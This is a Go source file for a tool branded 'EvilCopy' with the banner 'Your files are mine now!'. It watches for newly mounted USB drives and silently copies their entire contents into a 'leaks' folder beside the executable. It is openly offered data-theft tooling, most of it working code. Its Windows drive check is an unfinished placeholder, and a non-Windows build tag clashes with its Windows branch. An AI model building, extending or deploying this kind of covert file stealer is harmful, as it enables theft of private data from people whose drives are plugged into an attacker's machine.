//go:build !windows

package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/fsnotify/fsnotify"
)

var existingDrives map[string]bool

func init() {
	existingDrives = make(map[string]bool)
}

func printLogo() {
	logo := `
███████╗██╗   ██╗██╗██╗      ██████╗ ██████╗ ██████╗ ██╗   ██╗
██╔════╝██║   ██║██║██║     ██╔════╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
█████╗  ██║   ██║██║██║     ██║     ██║   ██║██████╔╝ ╚████╔╝ 
██╔══╝  ╚██╗ ██╔╝██║██║     ██║     ██║   ██║██╔═══╝   ╚██╔╝  
███████╗ ╚████╔╝ ██║███████╗╚██████╗╚██████╔╝██║        ██║   
╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝        ╚═╝   
   █   ▄██   █      ▄█   █      ▄█   █      ▄█   ██   █  
   ▀    ▀    ▀       ▀    ▀       ▀    ▀       ▀    ▀    ▀  
         ▀             ▀             ▀             ▀      

 Stealth Backup - Your files are mine now! By bI8d0 v1.0
`
	fmt.Println(logo)
}

var watchPath string

func main() {
	printLogo()

	done := make(chan bool)

	if runtime.GOOS == "windows" {
		getExistingDrives()
		go watchWindowsDrives(done)
	} else {
		watchPath = "/media"
		go watchLinuxDrives(done)
	}

	<-done
	log.Println("Backup process completed. Exiting program.")
}

func watchWindowsDrives(done chan bool) {
	for {
		drives := getWindowsDrives()
		for _, drive := range drives {
			if !existingDrives[drive] {
				log.Println("New USB device detected:", drive)
				existingDrives[drive] = true
				go func(d string) {
					backupDevice(d)
					done <- true
				}(drive)
				return
			}
		}
		time.Sleep(time.Second * 1)
	}
}

func getWindowsDrives() []string {
	drives := []string{}
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := string(drive) + ":\\"
		_, err := os.Stat(drivePath)
		if err == nil {
			if isRemovableDrive(drivePath) {
				drives = append(drives, drivePath)
			}
		}
	}
	return drives
}

func isRemovableDrive(drive string) bool {
	// Windows implementation
	return true // Placeholder, implement the real logic here
}

func watchLinuxDrives(done chan bool) {
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.Fatal(err)
	}
	defer watcher.Close()

	addDirAndSubdirsToWatcher := func(dir string) error {
		log.Printf("Adding directory to watch: %s\n", dir)
		return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				log.Printf("Error accessing path %s: %v\n", path, err)
				return nil
			}
			if info.IsDir() {
				err = watcher.Add(path)
				if err != nil {
					log.Printf("Error watching path %s: %v\n", path, err)
				} else {
					log.Printf("Now watching: %s\n", path)
				}
			}
			return nil
		})
	}

	err = addDirAndSubdirsToWatcher(watchPath)
	if err != nil {
		log.Fatal(err)
	}

	go func() {
		for {
			select {
			case event, ok := <-watcher.Events:
				if !ok {
					return
				}
				log.Printf("Event: %s\n", event)
				if event.Op&fsnotify.Create == fsnotify.Create || event.Op&fsnotify.Write == fsnotify.Write {
					if info, err := os.Stat(event.Name); err == nil && info.IsDir() {
						log.Printf("New directory detected: %s\n", event.Name)
						addDirAndSubdirsToWatcher(event.Name)
					}

					if isNewUSBDrive(event.Name) {
						log.Println("New USB device detected:", event.Name)
						go func() {
							time.Sleep(time.Second * 2)
							log.Println("Starting backup for:", event.Name)
							backupDevice(event.Name)
							log.Println("Backup completed for:", event.Name)
							done <- true
						}()
					}
				}
			case err, ok := <-watcher.Errors:
				if !ok {
					return
				}
				log.Println("error:", err)
			}
		}
	}()

	log.Println("Watching for USB drives...")
	<-done
}

func isNewUSBDrive(path string) bool {
	log.Printf("Checking if %s is a new USB drive\n", path)

	info, err := os.Stat(path)
	if err != nil {
		log.Printf("Error stating %s: %v\n", path, err)
		return false
	}
	if !info.IsDir() {
		log.Printf("%s is not a directory\n", path)
		return false
	}

	if !strings.HasPrefix(path, watchPath+"/") {
		log.Printf("%s is not within %s\n", path, watchPath)
		return false
	}

	parts := strings.Split(path, "/")
	if len(parts) >= 4 {
		log.Printf("%s is considered a new USB drive\n", path)
		return true
	}

	log.Printf("%s is not considered a new USB drive\n", path)
	return false
}

func backupDevice(sourcePath string) {
	execDir, err := os.Executable()
	if err != nil {
		log.Println("Error getting executable path:", err)
		return
	}
	execDir = filepath.Dir(execDir)

	backupDir := filepath.Join(execDir, "leaks")
	err = os.MkdirAll(backupDir, os.ModePerm)
	if err != nil {
		log.Println("Error creating leaks directory:", err)
		return
	}

	destPath := filepath.Join(backupDir, fmt.Sprintf("leaks_%s", time.Now().Format("20060102_150405")))
	err = os.MkdirAll(destPath, os.ModePerm)
	if err != nil {
		log.Println("Error creating leaks subdirectory:", err)
		return
	}

	logFile, err := os.Create(filepath.Join(destPath, "backup_log.txt"))
	if err != nil {
		log.Println("Error creating log file:", err)
		return
	}
	defer logFile.Close()

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 5)

	err = filepath.Walk(sourcePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Printf("Error accessing path %s: %v\n", path, err)
			return nil
		}

		relPath, err := filepath.Rel(sourcePath, path)
		if err != nil {
			log.Printf("Error getting relative path for %s: %v\n", path, err)
			return nil
		}

		destFile := filepath.Join(destPath, relPath)

		if info.IsDir() {
			return os.MkdirAll(destFile, info.Mode())
		}

		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			err := copyFile(path, destFile)
			if err != nil {
				log.Printf("Error copying file %s: %v\n", path, err)
				logFile.WriteString(fmt.Sprintf("Failed to copy: %s - %v\n", relPath, err))
			} else {
				logFile.WriteString(fmt.Sprintf("Copied: %s\n", relPath))
			}
		}()

		return nil
	})

	wg.Wait()

	if err != nil {
		log.Println("Error during backup:", err)
	} else {
		log.Println("Backup completed successfully to", destPath)
	}
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("error opening source file: %v", err)
	}
	defer sourceFile.Close()

	err = os.MkdirAll(filepath.Dir(dst), os.ModePerm)
	if err != nil {
		return fmt.Errorf("error creating destination directory: %v", err)
	}

	destFile, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("error creating destination file: %v", err)
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return fmt.Errorf("error copying file: %v", err)
	}

	return nil
}

func getExistingDrives() {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := string(drive) + ":\\"
		_, err := os.Stat(drivePath)
		if err == nil {
			if isRemovableDrive(drivePath) {
				existingDrives[drivePath] = true
				log.Printf("Existing removable drive detected: %s\n", drivePath)
			}
		}
	}
}
